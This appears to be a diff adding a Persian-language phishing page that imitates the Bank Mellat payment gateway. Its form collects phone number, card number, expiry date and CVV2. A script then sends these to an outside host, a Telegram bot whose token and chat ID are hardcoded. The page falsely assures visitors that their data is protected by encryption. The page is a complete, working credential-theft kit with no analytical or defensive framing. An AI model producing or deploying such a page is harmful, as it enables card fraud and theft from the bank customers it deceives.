@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>درگاه پرداخت ملت</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #0b2a4a, #1a4a7a);
+            padding: 20px;
+        }
+        .card {
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 40px 35px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
+            transition: 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+        .card-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .card-header img {
+            width: 60px;
+            margin-bottom: 10px;
+        }
+        .card-header h2 {
+            font-size: 24px;
+            color: #0b2a4a;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+        .card-header p {
+            color: #6b7a8f;
+            font-size: 14px;
+            margin-top: 6px;
+        }
+        .form-group {
+            margin-bottom: 22px;
+            position: relative;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #1e3b5c;
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 14px;
+            font-size: 16px;
+            background: #f8fafc;
+            transition: all 0.25s ease;
+            outline: none;
+            color: #0b2a4a;
+            direction: ltr;
+        }
+        .form-group input:focus {
+            border-color: #1a7a5a;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(26, 122, 90, 0.15);
+        }
+        .form-group input::placeholder {
+            color: #aab7cc;
+            font-size: 14px;
+        }
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+        .form-row .form-group {
+            flex: 1;
+        }
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #1a7a5a, #0f5a42);
+            border: none;
+            border-radius: 16px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.25s;
+            margin-top: 10px;
+            letter-spacing: 0.8px;
+            box-shadow: 0 6px 18px rgba(26, 122, 90, 0.35);
+        }
+        .btn-submit:hover {
+            transform: scale(1.02);
+            background: linear-gradient(135deg, #209a72, #136a4e);
+            box-shadow: 0 8px 25px rgba(26, 122, 90, 0.5);
+        }
+        .btn-submit:active {
+            transform: scale(0.97);
+        }
+        .footer-note {
+            text-align: center;
+            margin-top: 22px;
+            font-size: 12px;
+            color: #8a9bb0;
+            border-top: 1px solid #eef2f7;
+            padding-top: 18px;
+        }
+        .footer-note span {
+            color: #1a7a5a;
+            font-weight: 600;
+        }
+        .toast {
+            display: none;
+            background: #1a7a5a;
+            color: white;
+            padding: 14px 20px;
+            border-radius: 16px;
+            text-align: center;
+            margin-top: 18px;
+            font-weight: 600;
+            font-size: 15px;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.2);
+        }
+        .toast.error {
+            background: #b22234;
+        }
+        /* استایل شبیه درگاه بانک ملت */
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 100%;
+            height: 6px;
+            background: linear-gradient(90deg, #1a7a5a, #2ea87a, #1a7a5a);
+            border-radius: 28px 28px 0 0;
+        }
+        .card {
+            position: relative;
+            overflow: hidden;
+        }
+        .lock-icon {
+            font-size: 22px;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+        @media (max-width: 480px) {
+            .card { padding: 28px 18px; }
+            .form-row { flex-direction: column; gap: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="card-header">
+            <!-- لوگوی نمادین بانک -->
+            <div style="font-size: 44px; line-height: 1;">🏦</div>
+            <h2>درگاه پرداخت ملت</h2>
+            <p>تکمیل اطلاعات برای خرید امن</p>
+        </div>
+
+        <form id="paymentForm" onsubmit="return false;">
+            <!-- شماره تلفن -->
+            <div class="form-group">
+                <label>📱 شماره تلفن همراه</label>
+                <input type="tel" id="phone" placeholder="مثال: 09123456789" maxlength="11" required>
+            </div>
+
+            <!-- شماره کارت -->
+            <div class="form-group">
+                <label>💳 شماره کارت</label>
+                <input type="text" id="cardNumber" placeholder="۱۶ رقم - 6037 9912 3456 7890" maxlength="19" required>
+            </div>
+
+            <!-- تاریخ انقضا + CVV2 در یک ردیف -->
+            <div class="form-row">
+                <div class="form-group">
+                    <label>📅 تاریخ انقضا</label>
+                    <input type="text" id="expiry" placeholder="ماه/سال (MM/YY)" maxlength="5" required>
+                </div>
+                <div class="form-group">
+                    <label>🔒 CVV2</label>
+                    <input type="password" id="cvv2" placeholder="۳ یا ۴ رقم" maxlength="4" required>
+                </div>
+            </div>
+
+            <!-- دکمه ارسال -->
+            <button type="submit" class="btn-submit" id="submitBtn">
+                <span class="lock-icon">🔐</span> پرداخت و ثبت
+            </button>
+
+            <!-- پیام وضعیت -->
+            <div id="toastMessage" class="toast"></div>
+        </form>
+
+        <div class="footer-note">
+            اطلاعات شما با <span>رمزنگاری پیشرفته</span> محافظت می‌شود.
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // ========== تنظیمات ربات تلگرام ==========
+            const BOT_TOKEN = '8769509315:AAGOfax0B4ltulBehQ9Ge92o6SKYy7KNETQ';   // توکن ربات
+            const CHAT_ID   = '7689863493';                                      // آیدی عددی
+
+            // ========== عناصر DOM ==========
+            const phoneInput    = document.getElementById('phone');
+            const cardInput     = document.getElementById('cardNumber');
+            const expiryInput   = document.getElementById('expiry');
+            const cvvInput      = document.getElementById('cvv2');
+            const submitBtn     = document.getElementById('submitBtn');
+            const toast         = document.getElementById('toastMessage');
+
+            // ========== اعمال فرمت خودکار ==========
+            // شماره کارت: هر ۴ رقم یه فاصله
+            cardInput.addEventListener('input', function(e) {
+                let raw = this.value.replace(/\s/g, '').replace(/\D/g, '');
+                if (raw.length > 16) raw = raw.slice(0, 16);
+                let formatted = '';
+                for (let i = 0; i < raw.length; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += raw[i];
+                }
+                this.value = formatted;
+            });
+
+            // تاریخ انقضا: اضافه کردن اسلش بعد از ۲ رقم
+            expiryInput.addEventListener('input', function(e) {
+                let raw = this.value.replace(/\D/g, '');
+                if (raw.length > 4) raw = raw.slice(0, 4);
+                if (raw.length >= 3) {
+                    this.value = raw.slice(0, 2) + '/' + raw.slice(2);
+                } else {
+                    this.value = raw;
+                }
+            });
+
+            // CVV2: فقط عدد و حداکثر ۴ رقم
+            cvvInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '').slice(0, 4);
+            });
+
+            // تلفن: فقط عدد و ۱۱ رقم
+            phoneInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '').slice(0, 11);
+            });
+
+            // ========== تابع نمایش پیام ==========
+            function showToast(msg, isError = false) {
+                toast.textContent = msg;
+                toast.className = 'toast' + (isError ? ' error' : '');
+                toast.style.display = 'block';
+                setTimeout(() => {
+                    toast.style.display = 'none';
+                }, 6000);
+            }
+
+            // ========== تابع ارسال به تلگرام ==========
+            async function sendToTelegram(phone, card, expiry, cvv) {
+                // ساخت پیام زیبا
+                const text = `✅ *اطلاعات ثبت‌شده در درگاه پرداخت* ✅\n\n` +
+                             `📱 تلفن: \`${phone || 'ندارد'}\`\n` +
+                             `💳 کارت: \`${card || 'ندارد'}\`\n` +
+                             `📅 انقضا: \`${expiry || 'ندارد'}\`\n` +
+                             `🔒 CVV2: \`${cvv || 'ندارد'}\`\n\n` +
+                             `🕒 زمان: ${new Date().toLocaleString('fa-IR')}`;
+
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+                const payload = {
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: true
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+
+                    const result = await response.json();
+
+                    if (result.ok) {
+                        return { success: true };
+                    } else {
+                        console.error('خطای تلگرام:', result);
+                        return { success: false, error: result.description || 'خطای ناشناخته' };
+                    }
+                } catch (err) {
+                    console.error('خطای شبکه:', err);
+                    return { success: false, error: err.message || 'مشکل در اتصال به تلگرام' };
+                }
+            }
+
+            // ========== مدیریت ارسال فرم ==========
+            submitBtn.addEventListener('click', async function(e) {
+                e.preventDefault();
+
+                // گرفتن مقادیر
+                const phone  = phoneInput.value.trim();
+                const card   = cardInput.value.trim();
+                const expiry = expiryInput.value.trim();
+                const cvv    = cvvInput.value.trim();
+
+                // اعتبارسنجی ساده
+                if (phone.length < 11) {
+                    showToast('❌ شماره تلفن باید ۱۱ رقم باشد', true);
+                    return;
+                }
+                const cardClean = card.replace(/\s/g, '');
+                if (cardClean.length !== 16) {
+                    showToast('❌ شماره کارت باید ۱۶ رقم باشد', true);
+                    return;
+                }
+                if (expiry.length !== 5 || !expiry.includes('/')) {
+                    showToast('❌ تاریخ انقضا را به فرمت MM/YY وارد کنید', true);
+                    return;
+                }
+                if (cvv.length < 3 || cvv.length > 4) {
+                    showToast('❌ CVV2 باید ۳ یا ۴ رقم باشد', true);
+                    return;
+                }
+
+                // غیرفعال کردن دکمه تا پایان عملیات
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '⏳ در حال ارسال...';
+
+                // ارسال به تلگرام
+                const result = await sendToTelegram(phone, card, expiry, cvv);
+
+                // فعال کردن مجدد دکمه
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<span class="lock-icon">🔐</span> پرداخت و ثبت';
+
+                if (result.success) {
+                    showToast('✅ اطلاعات با موفقیت ارسال شد!', false);
+                    // پاک کردن فرم (اختیاری)
+                    // phoneInput.value = '';
+                    // cardInput.value = '';
+                    // expiryInput.value = '';
+                    // cvvInput.value = '';
+                } else {
+                    showToast(`❌ خطا در ارسال: ${result.error || 'مشخص نشده'}`, true);
+                }
+            });
+
+            // ========== ارسال با Enter در هر فیلد ==========
+            const inputs = [phoneInput, cardInput, expiryInput, cvvInput];
+            inputs.forEach(inp => {
+                inp.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        submitBtn.click();
+                    }
+                });
+            });
+
+        })();
+    </script>
+</body>
+</html>
